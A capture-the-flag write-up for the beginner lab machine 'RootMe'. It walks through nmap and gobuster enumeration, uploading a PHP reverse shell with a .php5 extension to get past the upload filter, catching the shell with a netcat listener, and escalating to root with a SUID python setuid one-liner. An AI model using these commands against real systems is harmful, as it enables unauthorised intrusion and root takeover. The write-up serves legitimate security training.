# RootMe

## A ctf for beginners, can you root me?

### Questions

* Scan the machine, how many ports are open?
* What version of Apache are running?
* What is the hidden directory?
* user.txt?
* Search for files with SUID permission, which file is weird?
* root.txt?

## Enumeration

### Nmap

> nmap -sSVC -A -O -vv

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 22:13 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
Initiating Ping Scan at 22:13
Scanning 10.10.119.253 [4 ports]
Completed Ping Scan at 22:13, 0.77s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:13
Completed Parallel DNS resolution of 1 host. at 22:13, 0.01s elapsed
Initiating SYN Stealth Scan at 22:13
Scanning 10.10.119.253 [1000 ports]
Discovered open port 22/tcp on 10.10.119.253
Discovered open port 80/tcp on 10.10.119.253
Completed SYN Stealth Scan at 22:13, 5.50s elapsed (1000 total ports)
Initiating Service scan at 22:13
Scanning 2 services on 10.10.119.253
Completed Service scan at 22:13, 7.54s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.119.253
Retrying OS detection (try #2) against 10.10.119.253
Retrying OS detection (try #3) against 10.10.119.253
Retrying OS detection (try #4) against 10.10.119.253
Retrying OS detection (try #5) against 10.10.119.253
Initiating Traceroute at 22:14
Completed Traceroute at 22:14, 3.10s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:14
Completed Parallel DNS resolution of 2 hosts. at 22:14, 0.01s elapsed
NSE: Script scanning 10.10.119.253.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:14
NSE Timing: About 99.63% done; ETC: 22:14 (0:00:00 remaining)
Completed NSE at 22:15, 48.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:15
Completed NSE at 22:15, 2.96s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Nmap scan report for 10.10.119.253
Host is up, received reset ttl 61 (0.74s latency).
Scanned at 2020-10-12 22:13:40 BST for 97s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: HackIT - Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=43844%PV=Y%DS=4%DC=T%G=Y%TM=5F84C7
OS:65%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
OS:11NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 31.728 days (since Fri Sep 11 04:46:46 2020)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   470.81 ms 10.4.0.1
2   ... 3
4   736.20 ms 10.10.119.253

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.29 seconds
           Raw packets sent: 1130 (53.746KB) | Rcvd: 1082 (46.782KB)
```

#### Q: Scan the machine, how many ports are open?
> A: 2

#### Q: What version of Apache are running?
> A: 2.4.29

#### Q: What service is running on port 22?
> A: ssh

### finding Directories/files 

(i use gobuster (dirbuster was not working))

>gobuster dir -u http://10.10.63.255:80/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 33 -x html,php,txt

(the ip is different because I continued that writeup the other day)

![image](https://user-images.githubusercontent.com/53917092/95799616-9c977c80-0ccb-11eb-8c12-1261b632a434.png)

#### Q: What is the hidden directory?
> A: /panel/

checking the directory /panel/, we have

![image](https://user-images.githubusercontent.com/53917092/95799962-ad94bd80-0ccc-11eb-82b6-bebb559e010c.png)

let's try upload a shell

shell: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

>curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -o revs.php

remember to set a port to listening

>nc -lvp <port>

![image](https://user-images.githubusercontent.com/53917092/95800457-c487df80-0ccd-11eb-951b-1fa61fd38181.png)

"PHP isn't permitted"

let's try bypassing this using the ".php5" extension

mv revs.php revs.php5

![image](https://user-images.githubusercontent.com/53917092/95800910-fcdbed80-0cce-11eb-9775-7ede504b29aa.png)

it worked

to run click on "veja" ("see")

![image](https://user-images.githubusercontent.com/53917092/95801051-81c70700-0ccf-11eb-9179-d92c4d421c56.png)

it worked, we have shell

to get a tty

> python -c 'import pty;pty.spawn("/bin/bash")'
> Ctrl+Z 
> stty raw -echo
> fg
> export TERM=xterm

![image](https://user-images.githubusercontent.com/53917092/95801836-087ce380-0cd2-11eb-9d6a-dfcb6863ae6c.png)

### user.txt

#### finding

> find / -type f -name user.txt 2>/dev/null

![image](https://user-images.githubusercontent.com/53917092/95803052-770f7080-0cd5-11eb-8a1d-a00ca7024fa4.png)

#### getting

> cat /var/www/user.txt

![image](https://user-images.githubusercontent.com/53917092/95803222-f2712200-0cd5-11eb-9ae6-a8a542164dec.png)

### root.txt / Privilege Escalation

To look for the files with SUID permission we can use the command:

> find / -type f -user root -perm -4000 2>/dev/null

![image](https://user-images.githubusercontent.com/53917092/95803488-9ce94500-0cd6-11eb-9d5c-e8822a26ddb7.png)

#### Exploring python set uid capabilities

> python -c "import os;os.setuid(0);os.system('/bin/bash')"

![image](https://user-images.githubusercontent.com/53917092/95803893-a7f0a500-0cd7-11eb-9a16-463b7cbc950a.png)

#### getting

![image](https://user-images.githubusercontent.com/53917092/95803990-e1c1ab80-0cd7-11eb-9541-b517c1383b5d.png)

that's it, thanks for reading